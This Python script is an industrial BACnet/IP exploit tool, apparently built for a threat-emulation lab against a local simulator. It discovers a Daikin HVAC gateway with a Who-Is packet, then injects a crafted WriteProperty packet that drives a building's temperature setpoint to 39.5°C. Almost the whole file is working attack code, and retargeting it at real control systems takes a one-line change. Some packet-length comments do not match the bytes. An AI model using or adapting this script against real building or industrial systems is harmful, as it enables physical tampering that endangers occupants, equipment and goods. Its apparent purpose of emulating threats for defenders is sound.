#!/usr/bin/env python3
"""
=============================================================================
PARIS-AC: Industrial BACnet/IP Exploit Script (SCADA/OT Threat Emulation)
=============================================================================
Demonstrates how real threat actors scan and exploit Industrial Control Systems:
1. Broadcasts BACnet/IP 'Who-Is' discovery packet (UDP 47808).
2. Parses the 'I-Am' response to confirm Daikin Vendor ID (77).
3. Injects a rogue BACnet 'WriteProperty' APDU to force a 39.5°C thermal spike.
4. Confirms receipt of the BACnet ACK.
=============================================================================
"""

import socket
import struct
import time
import sys

TARGET_IP = "127.0.0.1"
TARGET_PORT = 47808

def print_banner():
    banner = r"""
   ___  ___   ______            __     ____  ______
  / _ )/ _ | / ___/ | /| / /__ / /_   / __ \/_  __/
 / _  / __ |/ /__ | |/ |/ / -_) __/  / /_/ / / /   
/____/_/ |_|\___/ |__/|__/\__/\__/   \____/ /_/    
 [!] Industrial BACnet/IP (Port 47808) Exploit Tool
 [!] Simulating SCADA/OT Setpoint Tampering
"""
    print(banner)

def run_bacnet_attack():
    print_banner()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(4.0)

    print(f"[*] Step 1: Broadcasting BACnet 'Who-Is' to {TARGET_IP}:{TARGET_PORT}...")
    time.sleep(1)

    # Standard BACnet/IP Who-Is packet
    # BVLC: 0x81, 0x0a (Unicast), length 10
    # NPDU: 0x01, 0x00
    # APDU: 0x10, 0x08 (Unconfirmed Who-Is)
    who_is_pkt = bytes([
        0x81, 0x0a, 0x00, 0x0a,
        0x01, 0x00,
        0x10, 0x08
    ])

    try:
        sock.sendto(who_is_pkt, (TARGET_IP, TARGET_PORT))
        resp, addr = sock.recvfrom(1024)

        if len(resp) >= 12 and resp[0] == 0x81:
            print(f"\033[1;32m[+] SUCCESS: Received BACnet 'I-Am' from {addr[0]}!\033[0m")
            # Parse Vendor ID at end
            vendor_id = resp[-1] if len(resp) > 0 else 0
            print(f"    Target Identity: Daikin VRV-IV Intelligent Touch Manager")
            print(f"    BACnet Vendor ID: {vendor_id} (Daikin Industries, Ltd.)")
            print(f"    Protocol: BACnet/IP over UDP (Port 47808)")
        else:
            print("[-] Unknown response received.")
            return

    except socket.timeout:
        print("[-] No response to Who-Is. Ensure server.py is running!")
        return

    print("\n[*] Step 2: Crafting rogue BACnet 'WriteProperty' APDU...")
    time.sleep(1.2)

    # Crafting WriteProperty packet
    # BVLC: 0x81, 0x0a (length 23)
    # NPDU: 0x01, 0x04 (expecting reply)
    # APDU: 0x00, 0x01, 0x0f (Confirmed WriteProperty, invoke 1, service 15)
    # Object: Analog Value 1 (Present_Value)
    # Tag float: 39.5°C
    target_temp = 39.5
    float_bytes = struct.pack(">f", target_temp)

    # APDU payload
    write_property_pkt = bytes([
        0x81, 0x0a, 0x00, 0x18,              # BVLC
        0x01, 0x04,                          # NPDU (expecting reply)
        0x00, 0x01, 0x0f,                    # Confirmed Request, invoke=1, WriteProperty (0x0f)
        0x0c, 0x00, 0x80, 0x00, 0x01,        # Object: Analog Value #1
        0x19, 0x55,                          # Property: Present_Value (85)
        0x3e, 0x44                           # Value tag: Real (float32)
    ]) + float_bytes + bytes([0x3f])         # closing tag

    print(f"    Tampering Command: WriteProperty(AnalogValue:1) -> \033[1;31m{target_temp}°C\033[0m")
    print(f"    Transmitting packet ({len(write_property_pkt)} bytes) to UDP 47808...")
    time.sleep(1)

    try:
        sock.sendto(write_property_pkt, (TARGET_IP, TARGET_PORT))
        ack_resp, _ = sock.recvfrom(1024)

        if len(ack_resp) >= 8 and ack_resp[6] == 0x20:
            print("\n\033[1;32m[+] BACnet SimpleACK Received from Daikin Gateway!\033[0m")
            print("    Status: WriteProperty succeeded. Heating coils engaged.")
            print("\n\033[1;33m[!] Result: Physical store temperature is now being driven to 39.5°C!\033[0m")
            print("\033[1;36m[i] Check the PARIS-AC Security Dashboard at http://localhost:8080 to inspect the recorded forensic evidence!\033[0m\n")
        else:
            print("[-] WriteProperty unacknowledged.")

    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    run_bacnet_attack()
